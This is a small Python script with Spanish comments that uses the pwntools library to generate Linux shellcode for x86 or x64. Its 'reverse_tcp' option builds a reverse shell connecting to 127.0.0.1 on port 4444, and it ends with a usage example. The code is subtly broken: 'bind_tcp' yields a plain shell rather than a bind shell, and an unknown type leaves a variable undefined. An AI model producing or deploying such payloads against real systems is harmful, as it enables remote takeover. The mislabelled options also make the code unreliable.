from pwn import asm, shellcraft
'''
Función que recibe dos parámetros: 
- 'arch' que indica la arquitectura de la máquina 
objetivo ('x86' o 'x64')
- 'shell_type' que especifica el tipo de que 
especifica el tipo de shellcode que se desea 
crear ('bind_tcp' o 'reverse_tcp'). 
La función utiliza los módulos 'shellcraft' y 
'asm' de Pwntools para generar el código 
ensamblador correspondiente al shellcode y luego 
lo convierte en bytes.
'''

def create_shellcode(arch, shell_type):
    if arch == 'x86':
        if shell_type == 'bind_tcp':
            asm_code = shellcraft.i386.linux.sh()
        elif shell_type == 'reverse_tcp':
            asm_code = shellcraft.i386.linux.revsh('127.0.0.1', 4444)
    elif arch == 'x64':
        if shell_type == 'bind_tcp':
            asm_code = shellcraft.amd64.linux.sh()
        elif shell_type == 'reverse_tcp':
            asm_code = shellcraft.amd64.linux.revsh('127.0.0.1', 4444)
    else:
        print("Error: Unsupported architecture")
        return None

    shellcode = asm(asm_code)
    return shellcode

''' 
Ejemplo de uso para crear un shellcode de tipo 
'reverse_tcp' para una máquina x86:

shellcode = create_shellcode('x86', 'reverse_tcp')
print(shellcode)
'''